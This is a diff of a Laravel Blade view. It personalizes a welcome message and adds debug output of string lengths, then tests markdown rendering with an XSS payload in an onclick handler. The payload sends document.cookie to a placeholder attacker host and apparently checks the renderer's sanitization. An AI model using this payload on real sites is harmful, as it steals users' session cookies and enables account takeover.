@@ -5,10 +5,16 @@
     <p>Current time: {{ date('F j, Y, g:i A') }}  </p>
 
     @if (Auth::check())
-    <p>Welcome Dave!</p>
+    <p>Welcome {{Auth::user()->display_name}}</p>
     @else
     Nope?
     @endif
+
+    22 => 244<br>
+    23 => 244<br>
+    57 => 356<br>
+    {{ strlen(Crypt::encrypt('iam@mariehogebrandt.semopjojpoijojiasdADPOJOOASDOIADjoadssauajuu'))}}
+    {{ strlen('iam@mariehogebrandt.semopjojpoijojiasdADPOJOOASDOIADjoadssauajuu')}}
 
 <h2>Testing Markdown</h2>
 {{ HTML::markdown('<a href=# onclick=\"document.location=\'http://not-real-xssattackexamples.com/xss.php?c=\'+escape\(document.cookie\)\;\">This is</a> an example of the PHP Typography project.
